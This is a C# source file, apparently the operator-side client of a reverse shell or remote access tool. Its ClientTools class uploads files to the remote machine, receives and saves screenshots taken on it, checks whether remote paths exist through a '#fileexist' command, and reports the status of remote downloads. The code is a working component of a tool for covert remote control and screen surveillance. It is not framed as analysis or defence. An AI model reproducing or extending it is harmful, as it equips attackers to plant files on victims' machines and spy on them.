using System;
using System.IO;
using System.Net;
using System.Text;

namespace ReverseShellClient
{
    public class ClientTools
    {
        readonly BinaryWriter bw;
        readonly BinaryReader br;
        readonly StreamWriter sw;
        readonly StreamReader sr;


        public ClientTools(BinaryWriter bw, BinaryReader br, StreamWriter sw, StreamReader sr)
        {
            this.bw = bw;
            this.br = br;
            this.sw = sw;
            this.sr = sr;
        }


        public void UploadFile(string fileLocation)
        {
            using (var readStream = new FileStream(fileLocation, FileMode.Open))
            {
                // Send the data length first
                bw.Write((int)new FileInfo(fileLocation).Length);
                bw.Flush();

                var buffer = new byte[1];
                while (readStream.Read(buffer, 0, 1) > 0)
                {
                    bw.Write(buffer[0]);
                    bw.Flush();
                }
            }

            var result = sr.ReadLine();

            if (result == "Success")
            {
                ConsoleColorTools.WriteCommandSuccess("File successfully uploaded to the server");
            }
            else
            {
                ConsoleColorTools.WriteCommandError("An error occured");
            }
        }


        public void ReceiveFile(string newFileLocation)
        {

        }


        public void WaitForServerToFinishFileDownload()
        {
            var result = sr.ReadLine();
            if (result.Contains("Success"))
            {
                ConsoleColorTools.WriteCommandSuccess("File downloaded successfully : " + result.Split(':')[1]);
            }
            else
            {
                var error = result.Split(':')[1];
                if (error == "IO")
                {
                    error = "can't write here (IO)";
                }
                else
                {
                    error = "network error";
                }

                ConsoleColorTools.WriteCommandError("An error occured : " + error);
            }
        }

        public void ReceiveScreenShot()
        {
            ConsoleColorTools.WriteCommandMessage("Waiting for screenshot data...");
            var fileName = DateTime.Now.ToShortDateString().Replace('/', '-')
                           + "_"
                           + DateTime.Now.Hour + '-' + DateTime.Now.Minute + '-' + DateTime.Now.Second
                           + ".png";

            // Get data length
            var dataLength = br.ReadInt32();

            using (var fs = new FileStream(fileName, FileMode.Create))
            {
                // Read all the data
                var buffer = new byte[1];
                for (int i = 0; i < dataLength; i++)
                {
                    br.Read(buffer, 0, 1);
                    fs.Write(buffer, 0, 1);
                }
            }

            ConsoleColorTools.WriteCommandSuccess("Screenshot saved : " + fileName);
        }

        public bool CheckForFileExist(string path, bool local)
        {
            if (local)
            {
                return File.Exists(path);
            }

            sw.WriteLine("#fileexist " + path);
            sw.Flush();
            return sr.ReadLine() == "true";
        }
        
        public void SayHello()
        {
            // Say hello to display the cmd path
            sw.WriteLine("Hello !");
            sw.Flush();
        }
    }
}
